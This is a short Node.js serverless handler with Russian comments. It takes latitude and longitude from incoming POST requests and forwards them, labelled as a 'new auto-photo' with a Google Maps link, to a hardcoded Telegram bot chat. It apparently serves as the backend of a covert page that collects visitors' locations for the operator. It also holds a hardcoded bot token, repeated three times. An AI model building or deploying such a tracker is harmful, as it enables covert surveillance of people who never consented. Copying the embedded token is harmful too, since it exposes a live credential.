// ⚠️ ВСТАВЬТЕ ВАШ ТОКЕН И CHAT ID ЗДЕСЬ! ⚠️
const YOUR_BOT_TOKEN = "7752183433:AAFy_IrScRXS2d1gqto7uk4nFUO0ISE11Cg7752183433:AAFy_IrScRXS2d1gqto7uk4nFUO0ISE11Cg7752183433:AAFy_IrScRXS2d1gqto7uk4nFUO0ISE11Cg";
const YOUR_CHAT_ID = "7931089642";

module.exports = async (req, res) => {
    // Разрешаем запросы
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method === 'POST') {
        try {
            const { latitude, longitude } = req.body;
            
            // Сообщение для вас
            const message = `📸 Новое авто-фото\n\n📍 Координаты:\nШирота: ${latitude}\nДолгота: ${longitude}\n\n🗺️ Карта: https://maps.google.com?q=${latitude},${longitude}`;
            
            // Отправка в ВАШ Telegram
            const telegramRes = await fetch(
                `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: YOUR_CHAT_ID, // Отправляется вам!
                        text: message
                    })
                }
            );
            
            const data = await telegramRes.json();
            
            if (data.ok) {
                res.json({ ok: true, message: 'Sent to admin' });
            } else {
                res.json({ ok: false, error: data.description });
            }
            
        } catch (error) {
            res.json({ ok: false, error: error.message });
        }
    }
};
